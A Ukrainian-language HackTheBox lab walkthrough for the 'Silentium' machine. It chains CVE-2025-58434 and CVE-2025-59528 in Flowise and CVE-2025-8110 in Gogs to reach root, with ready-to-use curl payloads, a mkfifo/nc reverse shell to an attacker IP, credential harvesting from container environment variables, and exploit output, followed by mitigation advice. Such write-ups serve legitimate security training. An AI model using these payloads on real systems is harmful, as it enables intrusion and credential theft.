HackTheBox — Silentium
ОС: Linux (Ubuntu 24.04)
Точка входу: Веб (Flowise на staging) → Docker-контейнер → SSH під ben → Gogs → CVE-2025-8110 → root

На піддомені staging.silentium.htb крутиться Flowise 3.0.5 з двома вразливостями: скидання пароля без автентифікації (CVE-2025-58434) та RCE (CVE-2025-59528). Через них отримуємо root усередині Docker-контейнера, звідки зі змінних середовища дістаємо пароль r04D!!_R4ge для SSH-користувача ben. Далі — Gogs на 127.0.0.1:3001, експлуатуємо CVE-2025-8110 і отримуємо root на хості (Gogs запущено з RUN_USER = root).

1. Enumeration
Nmap
bash
nmap -T4 -A -v 10.129.144.227
text
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Nmap повідомляє про редірект — додаємо хост у /etc/hosts:

bash
echo "10.129.144.227  silentium.htb" | sudo tee -a /etc/hosts
Virtual host fuzzing
На silentium.htb нічого цікавого, але це віртуальний хост. Фазимо піддомени:

bash
ffuf -H 'Host: FUZZ.silentium.htb' \
     -u http://silentium.htb \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -fs 178
Результат:

text
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 19ms]
Додаємо в hosts:

bash
echo "10.129.144.227  staging.silentium.htb" | sudo tee -a /etc/hosts
На staging.silentium.htb — Flowise, просить логін. Дефолтні креденшели не підходять, версія не вказана.

2. Foothold — Flowise
CVE-2025-58434 — скидання пароля без автентифікації
Перевіряємо репозиторій Flowise на свіжі CVE — знаходимо CVE-2025-58434: скидання пароля без автентифікації. Потрібен валідний email.

На головній сторінці silentium.htb — три імені: Marcus Thorne, Ben, Elena Rossi. Пробуємо ben@silentium.htb:

bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user":{"email":"ben@silentium.htb"}}' | jq .
Відповідь:

json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
    "tokenExpiry": "2026-05-24T21:30:43.390Z",
    "status": "active",
    ...
  }
}
Отримали tempToken. Скидаємо пароль:

bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
     -H "Content-Type: application/json" \
     -d '{
       "user":{
         "email":"ben@silentium.htb",
         "tempToken":"Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
         "password":"NewPassword"
       }
     }'
Відповідь 200 OK — пароль скинуто.

Вхід і визначення версії
Логинимося з ben@silentium.htb / NewPassword. У правому верхньому куті — значок шестерні, там версія:

text
Flowise 3.0.5
Це вразливо для CVE-2025-59528 — RCE.

CVE-2025-59528 — RCE
Генеруємо API-ключ у лівій панелі (або використовуємо дефолтний). Перевіряємо RCE пінгом на свій веб-сервер:

bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"ping -c 1 10.10.14.144\");return 1;})()})"
       }
     }'
Пінг дійшов — замінюємо на reverse shell:

bash
# слухач
nc -lvnp 4444

# експлойт
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.144 4444 >/tmp/f\");return 1;})()})"
       }
     }'
Отримуємо root усередині Docker-контейнера.

3. Shell as ben
У контейнері — root, але потрібно вибратися на хост. Дивимося змінні середовища:

bash
env
Знаходимо:

text
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SENDER_EMAIL=ben@silentium.htb
Пароль r04D!!_R4ge підходить для SSH-користувача ben на хості:

bash
ssh ben@silentium.htb
# пароль: r04D!!_R4ge
Якщо ssh зависає на expecting SSH2_MSG_KEX_ECDH_REPLY — знижуємо MTU:

bash
sudo ip link set dev tun0 mtu 1200
Ми на хості під ben.

4. Розвідка на хості
bash
ben@silentium:~$ ss -tlnp
Бачимо Gogs на 127.0.0.1:3001 — тільки loopback, ззовні недоступний. Дивимося конфіг:

bash
cat /opt/gogs/gogs/custom/conf/app.ini
Ключове:

ini
RUN_USER = root
Gogs працює від root — будь-яка RCE через нього дасть одразу root.

5. Port Forwarding
Пробрасуємо 3001 на Kali:

bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
Перевіряємо:

bash
curl -s http://localhost:3001 | head
text
<!DOCTYPE html>
<html>
<head data-suburl="">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	...
		<meta name="author" content="Gogs" />
Gogs доступний локально на Kali. Відкриваємо http://localhost:3001.

6. CVE-2025-8110 — Gogs RCE
Суть
Gogs не перевіряє, чи є файл, який перезаписується через PUT /api/v1/repos/.../contents/<file>, симлінком. Атакувальник:

Пушить симлінк malicious_link -> .git/config.

Через API записує в нього шкідливий .git/config зі рядком sshCommand = <reverse shell>.

Gogs іде за симлінком і перезаписує свій власний .git/config.

При наступній SSH-операції Gogs виконує sshCommand — RCE.

Підготовка
Вікно 1 — слухач:

bash
nc -lvnp 4444
Вікно 2 — SSH-тунель (не закривати):

bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
Вікно 3 — експлойт:

Дізнаємося свій tun0 IP:

bash
ip a show tun0 | grep inet
# inet 10.10.14.144/23 ...
Запускаємо PoC (адаптований під Silentium — з -un/-pw для існуючого користувача, що обходить капчу при реєстрації):

bash
python3 CVE-2025-8110.py \
  -u http://localhost:3001 \
  -lh 10.10.14.144 \
  -lp 4444 \
  -un NewUsers \
  -pw GogsPassword
Вивід експлойта
text
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 44d191f24805eb4f165162eeb943700496590414
Repo creation status: 201
Клонирование в «/tmp/caaafaf0fa74»...
...
[master f5f79a4] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
...
To http://localhost:3001/NewUsers/caaafaf0fa74.git
   8812c81..f5f79a4  master -> master
[+] Exploit sent, check your listener!
[-] Error: HTTPConnectionPool(host='localhost', port=3001): Read timed out. (read timeout=5)
Read timed out — очікувана ознака успіху. Gogs виконав наш sshCommand і пішов у reverse shell замість відповіді на HTTP-запит.

7. Root
У вікні слухача:

text
listening on [any] 4444 ...
connect to [10.10.14.144] from (UNKNOWN) [10.129.144.227] 40198
bash: cannot set terminal process group (1491): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# id
uid=0(root) gid=0(root) groups=0(root)
Одразу root, бо RUN_USER = root.

Стабілізація TTY
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z, у Kali:

bash
stty raw -echo; fg
Enter, Enter. У шелі:

bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
8. Flags
bash
root@silentium:~# cat /home/ben/user.txt
a44ec12e354a9ae38b0574fc7888a19a

root@silentium:~# cat /root/root.txt
52198fb7afbca1b6bb01ab68db1c6324
9. Підсумок / Mitigation
Ланцюг атаки
text
Recon (nmap, ffuf)
   └── staging.silentium.htb → Flowise 3.0.5
         ├── CVE-2025-58434 (скидання пароля без автентифікації)
         │     └── доступ до адмінки Flowise
         └── CVE-2025-59528 (RCE)
               └── root у Docker-контейнері
                     └── env: SMTP_PASSWORD=r04D!!_R4ge
                           └── SSH ben@silentium.htb
                                 └── Gogs на 127.0.0.1:3001 (RUN_USER = root)
                                       └── SSH-тунель -L 3001:127.0.0.1:3001
                                             └── CVE-2025-8110 (symlink → .git/config → sshCommand)
                                                   └── RCE від root
                                                         └── root.txt
Як виправляти
Flowise: оновити до версії, де закрито CVE-2025-58434 та CVE-2025-59528. Скидання пароля має вимагати підтвердження по email, а не віддавати tempToken у відповіді API.

Не зберігати секрети у змінних середовища контейнера. SMTP_PASSWORD, FLOWISE_PASSWORD — усе це витікає при першій же RCE. Використовувати секрет-менеджер.

Не використовувати повторно паролі. r04D!!_R4ge від SMTP спрацював для SSH — так бути не повинно.

Gogs: оновити до версії, де закрито CVE-2025-8110 (валідація симлінків в API контенту).

Не запускати Gogs від root. RUN_USER = root перетворює будь-яку RCE на повне захоплення хоста. Обов'язково — окремий непривілейований користувач.

Обмежити права на .git/config — Gogs не повинен мати можливості перезаписувати власні конфіги гіта.

Моніторинг: відстежувати створення симлінків у репозиторіях і підозрілі зміни sshCommand.

Що запам'ятати
Read timed out у web-експлойтах — часто не помилка, а ознака, що payload відпрацював.

ssh -N -L надійніше за escape-послідовність ~C.

Завжди перевіряйте env у контейнері — секрети часто лежать там у відкритому вигляді.

Завжди перевіряйте RUN_USER у конфігах сервісів — часта причина «безкоштовного» root.

CVE-2025-8110 — чудовий приклад того, чому не можна довіряти симлінкам при роботі з файловими API.

Капча (CAPTCHA)
Використовується адаптований під Silentium PoC:
https://github.com/ixZODiAK/CVE-2025-8110

Це форк оригінального zAbuQasem/gogs-CVE-2025-8110, який приймає
прапорці -un та -pw для вже існуючого користувача Gogs —
це обходить капчу, увімкнену на Silentium (ENABLE_REGISTRATION_CAPTCHA = true).

Машину пройдено. GG! 🚀
